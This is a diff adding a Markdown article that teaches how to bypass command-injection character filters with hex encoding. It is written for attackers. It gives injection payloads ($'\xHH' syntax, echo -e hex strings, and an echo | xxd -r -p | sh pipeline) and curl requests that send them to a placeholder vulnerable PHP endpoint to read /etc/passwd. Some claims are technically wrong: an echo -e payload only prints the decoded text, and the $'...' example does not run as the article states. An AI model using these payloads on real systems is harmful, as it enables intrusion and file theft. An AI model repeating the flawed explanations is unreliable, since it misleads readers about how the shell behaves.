@@ -1,0 +1,100 @@
+---
+title: Bypass Characters Filter with Hex Encoding Techniques
+description: Learn how to leverage hex encoding to bypass character filters in web
+  applications using command injection techniques.
+keywords:
+- hex encoding
+- command injection
+- character filter bypass
+- hexadecimal encoding
+- decoding payloads
+- shell syntax
+- xxd tool
+- echo command
+---
+
+# Bypass Characters Filter Via Hex Encoding
+
+## Context
+
+When leveraging command injection vulnerabilities in web applications, attackers often encounter input filters designed to block dangerous characters. One effective technique to bypass these filters is using hex encoding, which can obfuscate special characters by representing them in hexadecimal form. This article will provide detailed steps and techniques for bypassing character filters using hex encoding in command injection exploits. Readers should have a solid understanding of hexadecimal encoding, character encoding, and basic command execution principles.
+
+## Theory
+
+### Hexadecimal Encoding in Command Injection
+
+Hexadecimal encoding is a method of representing characters using a base-16 numeral system. In the context of command injection, prohibited characters can be represented as `\xHH`, where `HH` denotes the character's hexadecimal value. For example, the space character can be encoded as `\x20`. Attackers can exploit filter deficiencies that block direct character inputs but fail to decode their hex-encoded counterparts. The key attack sequence involves encoding restricted characters into hex to sidestep filters and decoding them when the command is executed.
+
+### Hex String Representation in Shells
+
+Some shell environments, like Bash, support decoding hex-encoded strings at runtime using the `$'\\xHH'` syntax. This feature is particularly useful when exploiting web applications that inadequately handle user-provided input sent to shell commands. By encoding characters in hex and wrapping them in this syntax, attackers can bypass application filters and allow commands to execute as intended within the shell.
+
+### Payload Reconstruction via echo and xxd
+
+The `echo -e` command is a powerful shell utility that interprets escape sequences, including hex codes, converting them into respective characters. When deploying more complex payloads, tools like `xxd` can decode hex strings into raw bytes. `xxd` can reverse a hex string back into its original form using the `-r` flag, which is particularly useful when combined with piping and shell execution commands. This technique involves crafting a hex-encoded payload, using `echo` or `xxd` to decode it at command execution time.
+
+## Practice
+
+### Bypassing Filters with $'\\xHH' Shell Syntax
+
+One method of bypassing filters is by utilizing the `$'\\xHH'` syntax to encode and decode shell commands.
+
+- **Payload without Hex Encoding:**  
+  ```plaintext
+  $'cat /etc/passwd'
+  ```
+  Direct attempt may be blocked by filters.
+
+- **Hex Encoded Payload:**  
+  ```plaintext
+  $'cat\x20/etc/passwd'
+  ```
+  Here, the space character is encoded as `\x20`.
+
+- **Inject Using `curl`:**
+  ```bash
+  curl -G 'http://target/vuln.php?cmd=$%27cat%5Cx20%2Fetc%2Fpasswd%27'
+  ```
+
+  This command injects the hex-encoded payload to bypass the filter. Upon success, the system executes the `cat /etc/passwd` command.
+
+### Bypassing Filters Using echo -e for Hex Decoding
+
+This technique involves using `echo -e` to decode hex payloads into legitimate commands.
+
+- **Hex-encoded Command to Decode:**
+  ```plaintext
+  echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+  ```
+  This decodes to `cat /etc/passwd`.
+
+- **Inject Using `curl`:**
+  ```bash
+  curl -G 'http://target/vuln.php?cmd=echo%20-e%20%27%5Cx63%5Cx61%5Cx74%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%27'
+  ```
+
+  This results in the hex-encoded command being decoded and executed, bypassing character restrictions.
+
+### Bypassing Filters Using xxd for Payload Reconstruction
+
+Utilizing `xxd` offers a robust way to convert hex strings back into executable commands or scripts.
+
+- **Decoding Hex String with xxd:**
+  ```plaintext
+  echo 636174202f6574632f706173737764 | xxd -r -p | sh
+  ```
+  This transforms and executes the payload `cat /etc/passwd`.
+
+- **Inject Using `curl`:**
+  ```bash
+  curl -G 'http://target/vuln.php?cmd=echo%20636174202f6574632f706173737764%20%7C%20xxd%20-r%20-p%20%7C%20sh'
+  ```
+
+  This injection decodes the hex string to its original format and then executes it, effectively bypassing the character filter.
+
+## Tools
+
+- **curl**
+- **xxd** 
+
+By understanding and applying these techniques, attackers can effectively bypass character filters using hex encoding in vulnerable web applications.
